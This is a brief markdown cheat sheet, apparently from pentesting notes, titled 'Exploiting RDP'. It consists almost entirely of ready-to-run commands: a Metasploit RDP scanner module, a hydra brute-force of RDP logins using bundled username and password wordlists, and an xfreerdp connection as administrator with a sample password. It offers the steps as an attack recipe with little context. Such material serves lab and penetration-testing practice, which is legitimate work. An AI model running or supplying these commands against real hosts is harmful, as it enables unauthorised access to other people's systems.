# Exploiting RDP

## Automatic

__Scanning the rdp connection__
```
msfconsole
use auxiliary/scanner/rdp/rdp_scanner
set rhosts <target ip>
set rport <target port>
exploit
```

__brute force attack__
- `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /user/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>`


__connecting rdp using xfreerdp__
- `xfreerdp /u:administrator /p:qwertyuiop /v:<target ip>:<port_number>`
